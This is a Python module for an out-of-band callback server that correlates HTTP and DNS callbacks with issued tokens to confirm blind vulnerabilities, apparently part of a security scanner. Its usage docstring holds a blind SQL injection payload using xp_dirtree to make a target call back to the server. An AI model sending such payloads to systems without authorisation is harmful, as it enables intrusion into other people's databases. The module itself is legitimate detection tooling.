"""Out-of-band callback server — HTTP + DNS listener for blind vuln detection."""

from __future__ import annotations

import asyncio
import contextlib
import logging
import secrets
import struct
import time
from collections.abc import AsyncIterator
from contextlib import asynccontextmanager
from dataclasses import dataclass, field
from typing import Any

logger = logging.getLogger(__name__)


@dataclass(frozen=True)
class CallbackHit:
    """A single OOB callback received by the server."""

    token: str
    protocol: str  # "http" or "dns"
    source_ip: str
    timestamp: float
    data: dict[str, Any] = field(default_factory=dict)


@dataclass
class TokenInfo:
    """Metadata associated with a generated token."""

    token: str
    plugin: str
    target: str
    payload_type: str  # e.g. "sqli_blind", "ssrf", "xxe", "rce"
    created_at: float = field(default_factory=time.time)
    description: str = ""


class CallbackServer:
    """Async OOB callback server for blind vulnerability detection.

    Generates unique tokens per payload, runs HTTP + DNS listeners,
    and correlates received callbacks with issued tokens.

    Usage::

        async with CallbackServer(http_port=8880) as cb:
            token = cb.generate_token("sqli_basic", "target.com", "sqli_blind")
            payload = f"'; EXEC xp_dirtree '//{cb.domain}/{token}'; --"
            # ... send payload ...
            await asyncio.sleep(5)
            hits = cb.get_hits(token)
            if hits:
                print("Blind SQLi confirmed via OOB!")
    """

    def __init__(
        self,
        *,
        http_port: int = 8880,
        dns_port: int = 8853,
        callback_domain: str = "",
        http_host: str = "0.0.0.0",
    ) -> None:
        self.http_port = http_port
        self.dns_port = dns_port
        self.http_host = http_host
        self._callback_domain = callback_domain
        self._tokens: dict[str, TokenInfo] = {}
        self._hits: dict[str, list[CallbackHit]] = {}
        self._http_server: asyncio.AbstractServer | None = None
        self._dns_transport: asyncio.DatagramTransport | None = None
        self._running = False

    @property
    def domain(self) -> str:
        """The domain plugins should use in OOB payloads."""
        if self._callback_domain:
            return self._callback_domain
        return f"127.0.0.1:{self.http_port}"

    @property
    def http_url(self) -> str:
        """Base HTTP URL for OOB callbacks."""
        return f"http://{self.domain}"

    def generate_token(
        self,
        plugin: str,
        target: str,
        payload_type: str,
        description: str = "",
    ) -> str:
        """Generate a unique token for a specific payload."""
        token = f"bsk{secrets.token_hex(8)}"
        self._tokens[token] = TokenInfo(
            token=token,
            plugin=plugin,
            target=target,
            payload_type=payload_type,
            description=description,
        )
        self._hits[token] = []
        return token

    def get_hits(self, token: str) -> list[CallbackHit]:
        """Get all callback hits for a specific token."""
        return list(self._hits.get(token, []))

    def has_callback(self, token: str) -> bool:
        """Check if any callback was received for the token."""
        return bool(self._hits.get(token))

    def get_all_hits(self) -> dict[str, list[CallbackHit]]:
        """Get all hits grouped by token."""
        return {t: list(h) for t, h in self._hits.items() if h}

    def get_token_info(self, token: str) -> TokenInfo | None:
        """Get metadata for a token."""
        return self._tokens.get(token)

    def build_payload_url(self, token: str, path: str = "") -> str:
        """Build a full OOB URL with the token for use in payloads."""
        return f"{self.http_url}/{token}{path}"

    def build_dns_payload(self, token: str) -> str:
        """Build a DNS OOB domain for use in payloads."""
        if self._callback_domain:
            return f"{token}.{self._callback_domain}"
        return f"{token}.callback.local"

    def _record_hit(
        self,
        token: str,
        protocol: str,
        source_ip: str,
        data: dict[str, Any] | None = None,
    ) -> None:
        """Record a callback hit."""
        hit = CallbackHit(
            token=token,
            protocol=protocol,
            source_ip=source_ip,
            timestamp=time.time(),
            data=data or {},
        )
        if token in self._hits:
            self._hits[token].append(hit)
            info = self._tokens.get(token)
            if info:
                logger.info(
                    "OOB callback: %s from %s (plugin=%s, target=%s, type=%s)",
                    protocol, source_ip, info.plugin,
                    info.target, info.payload_type,
                )
        else:
            logger.debug(
                "OOB callback for unknown token %s from %s", token, source_ip,
            )

    async def start(self) -> None:
        """Start HTTP and DNS listeners."""
        if self._running:
            return
        self._running = True
        await self._start_http()
        await self._start_dns()
        logger.info(
            "Callback server started (HTTP=%d, DNS=%d)",
            self.http_port, self.dns_port,
        )

    async def stop(self) -> None:
        """Stop all listeners."""
        self._running = False
        if self._http_server:
            self._http_server.close()
            await self._http_server.wait_closed()
            self._http_server = None
        if self._dns_transport:
            self._dns_transport.close()
            self._dns_transport = None
        logger.info("Callback server stopped")

    async def __aenter__(self) -> CallbackServer:
        await self.start()
        return self

    async def __aexit__(self, *_: Any) -> None:
        await self.stop()

    # --- HTTP listener ---

    async def _start_http(self) -> None:
        """Start a lightweight HTTP server that captures OOB callbacks."""
        try:
            server = await asyncio.start_server(
                self._handle_http, self.http_host, self.http_port,
            )
            self._http_server = server
        except OSError:
            logger.warning(
                "Could not start HTTP callback on port %d", self.http_port,
            )

    async def _handle_http(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter,
    ) -> None:
        """Handle an incoming HTTP request — extract token from path."""
        try:
            data = await asyncio.wait_for(reader.read(4096), timeout=5.0)
            request_line = data.split(b"\r\n")[0].decode(errors="replace")
            parts = request_line.split()
            path = parts[1] if len(parts) >= 2 else "/"

            # Extract peer address
            peer = writer.get_extra_info("peername")
            source_ip = peer[0] if peer else "unknown"

            # Parse token from path (first path segment)
            segments = [s for s in path.split("/") if s]
            token = segments[0] if segments else ""

            # Extract query/body for additional data
            req_data: dict[str, Any] = {
                "method": parts[0] if parts else "GET",
                "path": path,
                "raw_request": request_line,
            }

            if token and token in self._tokens:
                self._record_hit(token, "http", source_ip, req_data)

            # Respond with 200 OK
            response = (
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Type: text/plain\r\n"
                b"Content-Length: 2\r\n"
                b"Connection: close\r\n"
                b"\r\n"
                b"ok"
            )
            writer.write(response)
            await writer.drain()
        except Exception as e:
            logger.debug("HTTP callback handler error: %s", e)
        finally:
            writer.close()
            with contextlib.suppress(Exception):
                await writer.wait_closed()

    # --- DNS listener ---

    async def _start_dns(self) -> None:
        """Start a UDP DNS listener for OOB DNS exfiltration."""
        try:
            loop = asyncio.get_running_loop()
            transport, _ = await loop.create_datagram_endpoint(
                lambda: _DnsProtocol(self),
                local_addr=(self.http_host, self.dns_port),
            )
            self._dns_transport = transport
        except OSError:
            logger.warning(
                "Could not start DNS callback on port %d", self.dns_port,
            )

    def _handle_dns_query(
        self, data: bytes, addr: tuple[str, int],
    ) -> bytes | None:
        """Parse DNS query, extract token from subdomain, return response."""
        try:
            # Minimal DNS parsing: extract QNAME
            if len(data) < 12:
                return None

            txn_id = data[:2]
            data_len = len(data)
            # Skip header, parse question section
            offset = 12
            labels: list[str] = []
            while offset < data_len:
                length = data[offset]
                if length == 0:
                    offset += 1
                    break
                # Pointer compression (0xC0) — not expected in queries, bail out
                if length & 0xC0:
                    return None
                # Bounds check: label must fit within remaining data
                if offset + 1 + length > data_len:
                    logger.debug("DNS packet truncated at offset %d", offset)
                    return None
                # RFC 1035: label max 63 bytes
                if length > 63:
                    logger.debug("DNS label too long (%d) at offset %d", length, offset)
                    return None
                offset += 1
                label = data[offset:offset + length].decode(errors="replace")
                labels.append(label)
                offset += length

            if not labels:
                return None

            domain = ".".join(labels)
            # First label is the token
            token = labels[0]
            source_ip = addr[0]

            if token in self._tokens:
                self._record_hit(
                    token, "dns", source_ip,
                    {"domain": domain, "labels": labels},
                )

            # Build minimal DNS response (NXDOMAIN)
            response = bytearray(txn_id)
            _DNS_FLAGS_NXDOMAIN = 0x8183  # response + recursion available + NXDOMAIN
            response += struct.pack(">H", _DNS_FLAGS_NXDOMAIN)
            # QDCOUNT=1, ANCOUNT=0, NSCOUNT=0, ARCOUNT=0
            response += struct.pack(">HHHH", 1, 0, 0, 0)
            # Echo back the question section
            response += data[12:offset]
            # QTYPE and QCLASS
            if offset + 4 <= data_len:
                response += data[offset:offset + 4]
            else:
                response += struct.pack(">HH", 1, 1)  # A record, IN class

            return bytes(response)
        except Exception as e:
            logger.debug("DNS query parsing failed from %s: %s", addr[0], e)
            return None


class _DnsProtocol(asyncio.DatagramProtocol):
    """UDP protocol handler for DNS callback listener."""

    def __init__(self, server: CallbackServer) -> None:
        self._server = server
        self._transport: asyncio.DatagramTransport | None = None

    def connection_made(self, transport: asyncio.DatagramTransport) -> None:  # type: ignore[override]
        self._transport = transport

    def datagram_received(self, data: bytes, addr: tuple[str, int]) -> None:
        response = self._server._handle_dns_query(data, addr)
        if response and self._transport:
            self._transport.sendto(response, addr)


@asynccontextmanager
async def callback_server(
    **kwargs: Any,
) -> AsyncIterator[CallbackServer]:
    """Context manager for running the callback server."""
    server = CallbackServer(**kwargs)
    await server.start()
    try:
        yield server
    finally:
        await server.stop()
